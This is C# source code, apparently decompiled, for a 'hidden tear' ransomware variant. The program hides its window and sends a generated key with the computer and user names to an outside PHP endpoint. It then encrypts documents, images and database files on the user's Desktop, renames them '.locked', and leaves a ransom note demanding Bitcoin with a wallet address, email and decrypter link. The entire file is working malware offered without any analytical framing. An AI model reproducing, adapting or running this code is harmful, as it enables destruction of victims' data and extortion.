using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "http://foodforweekend.esy.es/images/food/hidden.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string text = computerName + ":" + userName + ":" + password;
		string address = targetURL + text;
		new WebClient().DownloadString(address);
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".locked");
	}

	public void encryptDirectory(string location, string password)
	{
		string[] source = new string[20]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
			".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				EncryptFile(files[i], password);
			}
		}
		for (int i = 0; i < directories.Length; i++)
		{
			encryptDirectory(directories[i], password);
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		string text = "\\Desktop";
		string location = userDir + userName + text;
		SendPassword(password);
		encryptDirectory(location, password);
		messageCreator();
		password = null;
		Application.Exit();
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\READ_IT.txt";
		string path = userDir + userName + text;
		string[] contents = new string[9] { "HI!  You have Been Victim Of a Virus.", " All your files have been encrypted and only we can decrypt them.", "For that you need to complete some simple steps.", "1 You need to pay us with 1 Bitcoin in this wallet:\t14PtNQA6kMKdAzuqH3vdv3qDTmGetHVLvY  ", "2 You need to download the decrypter program from here : https://www.sendspace.com/file/1hczio ", "3 You have to send us an email with any proof of Payment and you will recive an email with the KEY that you must enter ", "in decrypter program that you have downloaded at STEP 1 ", "Here is the email where we wait news from you:  forprotomail@gmx.com ", "Sorry for this! Next Time Use AntiVirus and do not download random files You can lose your data " };
		File.WriteAllLines(path, contents);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
